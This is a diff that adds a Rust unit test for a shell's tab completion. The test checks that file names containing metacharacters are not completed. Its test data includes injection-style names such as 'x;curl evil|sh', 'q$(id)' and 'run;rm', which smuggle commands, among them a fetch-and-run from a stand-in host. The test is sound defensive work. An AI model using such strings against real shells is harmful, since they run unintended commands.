@@ -363,6 +363,51 @@ mod words {
         let _ = std::fs::remove_dir_all(&root);
     }
 
+    /// A completion is typed into the shell unquoted, so one that would
+    /// split the word or run something (`my file`, `x;curl evil|sh`) is
+    /// not offered; plain names still complete.
+    #[test]
+    fn names_with_shell_metacharacters_are_not_completed() {
+        let root = tree("meta");
+        let cwd = root.join("project");
+        for name in [
+            "my file.txt",
+            "x;curl evil|sh",
+            "q$(id)",
+            "b`id`",
+            "g*glob",
+            "t\ttab",
+            "a&b",
+            "r>out",
+            "h#x",
+            "e!x",
+            "c{a,b}",
+        ] {
+            std::fs::write(cwd.join(name), "").unwrap();
+        }
+        std::fs::create_dir_all(cwd.join("dir with space")).unwrap();
+        let cwd = cwd.to_str();
+        let none: &[String] = &[];
+        for typed in [
+            "cat my", "cat x", "cat q", "cat b", "cat g", "cat t", "cat a", "cat r", "cat h",
+            "cat e", "cat c", "cd di",
+        ] {
+            assert_eq!(complete_word(typed, cwd, None, none), None, "{typed:?}");
+        }
+        let exes: Vec<String> = ["run;rm", "plain-tool"].map(String::from).to_vec();
+        assert_eq!(complete_word("run", None, None, &exes), None);
+        assert_eq!(
+            complete_word("pla", None, None, &exes).as_deref(),
+            Some("in-tool")
+        );
+        assert_eq!(
+            complete_word("cat REA", cwd, None, none).as_deref(),
+            Some("DME.md"),
+            "plain names still complete"
+        );
+        let _ = std::fs::remove_dir_all(&root);
+    }
+
     #[cfg(unix)]
     #[test]
     fn path_executables_lists_executable_files() {
